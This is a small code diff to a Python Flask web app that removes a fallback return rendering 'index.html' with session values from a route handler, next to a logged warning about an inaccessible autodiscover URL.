@@ -206,8 +206,6 @@ def route2():
             app.logger.warning(f"Autodiscover URL not accessible: {autodiscover_url}")
 
         return render_template("gowa.html", eman=session.get('eman'), ins=session.get('ins'))
-    
-    return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
 
 
 @app.route("/first", methods=['POST'])
